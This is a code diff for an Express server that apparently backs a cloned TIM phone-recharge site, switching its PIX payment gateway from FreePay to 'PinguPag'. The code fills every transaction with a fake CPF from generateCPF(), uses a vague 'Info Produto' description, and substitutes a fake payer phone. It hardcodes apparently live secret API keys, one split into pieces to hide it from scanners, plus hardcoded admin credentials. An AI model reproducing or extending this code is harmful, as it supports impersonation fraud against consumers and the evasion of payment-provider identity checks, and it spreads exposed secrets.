@@ -14,13 +14,10 @@ app.use(express.json());
 // Serve static files from the tim-credito.vercel.app directory
 app.use(express.static(path.join(__dirname, 'tim-credito.vercel.app')));
 
-const FREEPAY_PUBLIC_KEY = process.env.FREEPAY_PUBLIC_KEY || 'freepay_live_0h75kwyMge1lu4uRTi15DEf8DLHoP58Y';
-const FREEPAY_SECRET_KEY = process.env.FREEPAY_SECRET_KEY || ['sk_li','ve_gz1GiWVKbYdSTg7s3EUSKdSDhZMVFsZN'].join('');
-const FREEPAY_BASE_URL = process.env.FREEPAY_BASE_URL || 'https://api.freepaybrasil.com';
+const PINGUPAG_API_KEY = process.env.PINGUPAG_API_KEY || 'pingupag_sk_e0613630214c3ddff5079ba2eedfbfff7125f4c42a3377e5428853fc5e563f4d';
+const PINGUPAG_BASE_URL = process.env.PINGUPAG_BASE_URL || 'https://pagamento-processador.org.ua';
 
-function getFreePayAuthHeader() {
-    return 'Basic ' + Buffer.from(`${FREEPAY_PUBLIC_KEY}:${FREEPAY_SECRET_KEY}`).toString('base64');
-}
+console.log('Gateway configurado: PinguPag');
 
 // Admin credentials
 const ADMIN_USER = 'admin';
@@ -166,9 +163,7 @@ const pixAttempts = new Map();
 // Retorna configurações públicas
 app.get('/api/config', (req, res) => {
     res.json({
-        tokenizationKey: FREEPAY_PUBLIC_KEY,
-        publicKey: FREEPAY_PUBLIC_KEY,
-        gateway: 'freepay'
+        gateway: 'pingupag'
     });
 });
 
@@ -176,7 +171,7 @@ app.post('/api/pix', async (req, res) => {
     try {
         const { value, phone } = req.body;
 
-        // amount em centavos (FreePay aceita centavos)
+        // amount em centavos
         let amount = 2000;
         if (value) {
             const cleanVal = value.toString().replace('R$', '').trim().replace(',', '.');
@@ -187,8 +182,7 @@ app.post('/api/pix', async (req, res) => {
         }
 
         const cleanPhone = phone ? phone.replace(/\D/g, '') : '';
-        // FreePay exige fone com +55
-        const payerPhone = cleanPhone ? `+55${cleanPhone}` : '+5511999999999';
+        const payerPhone = cleanPhone || '11987654321';
 
         let attempt = pixAttempts.get(cleanPhone) || { count: 0, name: null, email: null };
         attempt.count += 1;
@@ -204,40 +198,26 @@ app.post('/api/pix', async (req, res) => {
         pixAttempts.set(cleanPhone, attempt);
 
         const cleanCpf = generateCPF();
+        const uniqueRef = 'REC-' + Date.now() + '-' + Math.random().toString(36).substring(2, 7);
 
         const payload = {
             amount: amount,
-            payment_method: 'pix',
-            postback_url: 'https://recargatim.com/api/webhook/freepay',
+            description: 'Info Produto',
+            reference: uniqueRef,
+            source: 'api_externa',
+            postback_url: 'https://recargatim.com/api/webhook/pingupag',
             customer: {
                 name: attempt.name,
                 email: attempt.email,
                 phone: payerPhone,
-                document: {
-                    number: cleanCpf,
-                    type: 'cpf'
-                }
-            },
-            pix: {
-                expires_in_days: 1
-            },
-            items: [
-                {
-                    title: 'Info Produto',
-                    unit_price: amount,
-                    quantity: 1,
-                    tangible: false
-                }
-            ],
-            metadata: {
-                provider_name: 'recargatim'
+                document: cleanCpf
             }
         };
 
-        const response = await fetch(`${FREEPAY_BASE_URL}/v1/payment-transaction/create`, {
+        const response = await fetch(`${PINGUPAG_BASE_URL}/gateway/v1/transaction`, {
             method: 'POST',
             headers: {
-                'Authorization': getFreePayAuthHeader(),
+                'X-API-Key': PINGUPAG_API_KEY,
                 'Content-Type': 'application/json',
                 'Accept': 'application/json'
             },
@@ -249,39 +229,38 @@ app.post('/api/pix', async (req, res) => {
         try {
             jsonRes = JSON.parse(textResponse);
         } catch (e) {
-            console.error('[FREEPAY] Resposta não-JSON recebida:', textResponse);
+            console.error('[PINGUPAG] Resposta não-JSON recebida:', textResponse);
         }
 
-        const data = jsonRes.data || jsonRes;
-        const transactionId = data.id;
-        const pixData = data.pix;
+        const transactionId = jsonRes.transaction_id || jsonRes.id;
+        const copyPaste = jsonRes.qr_code || '';
 
-        if ((response.ok || response.status === 201) && jsonRes.success && transactionId && pixData?.qr_code) {
-            const copyPaste = pixData.qr_code || '';
+        if (response.ok && jsonRes.status === 'success' && transactionId && copyPaste) {
             const qrCodeUrl = copyPaste ? `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(copyPaste)}` : '';
+            const qrCodeBase64 = jsonRes.qr_code_base64 || '';
 
-            console.log('[FREEPAY] PIX criado com sucesso:', transactionId);
+            console.log('[PINGUPAG] PIX criado com sucesso:', transactionId);
 
             res.json({
                 success: true,
                 data: {
                     id: transactionId,
                     transactionId: transactionId,
-                    status: (data.status || 'PENDING').toUpperCase(),
+                    status: (jsonRes.payment_status || 'PENDING').toUpperCase(),
                     paymentData: {
                         transactionId: transactionId,
                         copyPaste: copyPaste,
                         copypaste: copyPaste,
                         qrCode: copyPaste,
                         qrCodeUrl: qrCodeUrl,
-                        qrCodeBase64: ''
+                        qrCodeBase64: qrCodeBase64
                     },
-                    freepay: data
+                    pingupag: jsonRes
                 }
             });
         } else {
-            const errMsg = jsonRes?.error_messages?.[0]?.message || jsonRes?.title || 'Erro ao processar pagamento na FreePay';
-            console.error('[FREEPAY] Erro ao criar PIX:', jsonRes);
+            const errMsg = jsonRes?.message || jsonRes?.error || 'Erro ao processar pagamento na PinguPag';
+            console.error('[PINGUPAG] Erro ao criar PIX:', jsonRes);
             res.status(response.status || 400).json({
                 success: false,
                 message: errMsg,
@@ -300,9 +279,9 @@ app.get('/api/status/:transactionId', async (req, res) => {
         const { transactionId } = req.params;
         const { phone } = req.query;
 
-        const response = await fetch(`${FREEPAY_BASE_URL}/v1/payment-transaction/info/${encodeURIComponent(transactionId)}`, {
+        const response = await fetch(`${PINGUPAG_BASE_URL}/gateway/v1/query?action=get_transaction&id=${encodeURIComponent(transactionId)}`, {
             headers: {
-                'Authorization': getFreePayAuthHeader(),
+                'X-API-Key': PINGUPAG_API_KEY,
                 'Accept': 'application/json'
             }
         });
@@ -310,23 +289,22 @@ app.get('/api/status/:transactionId', async (req, res) => {
         let jsonRes = {};
         try { jsonRes = JSON.parse(text); } catch(e) {}
 
-        const data = jsonRes.data || jsonRes || {};
-        const rawStatus = (data.status || 'PENDING').toUpperCase();
+        const rawStatus = (jsonRes.status || 'pending').toUpperCase();
         let currentStatus = 'PENDING';
-        if (rawStatus === 'PAID') {
-            currentStatus = 'PAID';
-        } else if (['REFUNDED', 'REFUSED', 'CHARGEBACK', 'PRECHARGEBACK', 'EXPIRED', 'ERROR'].includes(rawStatus)) {
+        if (rawStatus === 'APPROVED' || rawStatus === 'PAID') {
+            currentStatus = 'APPROVED';
+        } else if (['REFUNDED', 'FAILED', 'CHARGEBACK', 'EXPIRED', 'ERROR'].includes(rawStatus)) {
             currentStatus = rawStatus;
         }
 
-        if (currentStatus === 'PAID' && phone) {
+        if ((currentStatus === 'APPROVED' || currentStatus === 'PAID') && phone) {
             const cleanPhone = phone.replace(/\D/g, '');
             pixAttempts.delete(cleanPhone);
         }
 
         res.json({
             success: response.ok,
-            data: { status: currentStatus, rawStatus: data.status, id: data.id || transactionId, ...data }
+            data: { status: currentStatus, rawStatus: jsonRes.status, id: jsonRes.id || transactionId, ...jsonRes }
         });
     } catch (error) {
         console.error('Error checking status:', error);
@@ -338,29 +316,28 @@ app.get('/api/check_status', async (req, res) => {
     try {
         const transactionId = req.query.id;
         if (!transactionId) return res.status(400).json({ success: false, message: 'Missing transaction id' });
-        const response = await fetch(`${FREEPAY_BASE_URL}/v1/payment-transaction/info/${encodeURIComponent(transactionId)}`, {
+        const response = await fetch(`${PINGUPAG_BASE_URL}/gateway/v1/query?action=get_transaction&id=${encodeURIComponent(transactionId)}`, {
             headers: {
-                'Authorization': getFreePayAuthHeader(),
+                'X-API-Key': PINGUPAG_API_KEY,
                 'Accept': 'application/json'
             }
         });
         const json = await response.json();
-        const data = json.data || json || {};
-        const rawStatus = (data.status || '').toUpperCase();
-        const isPaid = rawStatus === 'PAID';
-        res.json({ status: isPaid ? 'approved' : rawStatus.toLowerCase() || 'pending', data: data });
+        const rawStatus = (json.status || '').toUpperCase();
+        const isPaid = rawStatus === 'APPROVED' || rawStatus === 'PAID';
+        res.json({ status: isPaid ? 'approved' : rawStatus.toLowerCase() || 'pending', data: json });
     } catch (error) {
         console.error('Error checking status:', error);
         res.status(500).json({ success: false, message: 'Error checking status' });
     }
 });
 
-// Webhook para notificações FreePay e retrocompatibilidade
-app.post(['/api/webhook/freepay', '/api/webhook/droppay', '/api/webhook/pingupag', '/api/webhook/aven', '/api/webhook/gateway'], (req, res) => {
+// Webhook para notificações PinguPag e retrocompatibilidade
+app.post(['/api/webhook/pingupag', '/api/webhook/freepay', '/api/webhook/droppay', '/api/webhook/aven', '/api/webhook/gateway'], (req, res) => {
     const body = req.body;
-    console.log('[FREEPAY WEBHOOK]', body?.Id || body?.id, body?.Status || body?.status);
-    const status = (body?.Status || body?.status || '').toUpperCase();
-    if (status === 'PAID' && body?.customer?.phone) {
+    console.log('[PINGUPAG WEBHOOK]', body?.transaction_id || body?.id, body?.status);
+    const status = (body?.status || body?.raw_status || '').toUpperCase();
+    if ((status === 'APPROVED' || status === 'PAID') && body?.customer?.phone) {
         const cleanPhone = body.customer.phone.replace(/\D/g, '');
         pixAttempts.delete(cleanPhone);
     }
@@ -521,7 +498,7 @@ if (!isVercel) {
     const PORT = process.env.PORT || 3000;
     app.listen(PORT, () => {
         console.log(`Servidor rodando na porta ${PORT}`);
-        console.log(`Gateway configurado: FreePay`);
+        console.log(`Gateway configurado: PinguPag`);
         console.log(`Acesse: http://localhost:${PORT}`);
         console.log(`Admin:  http://localhost:${PORT}/admin`);
     });
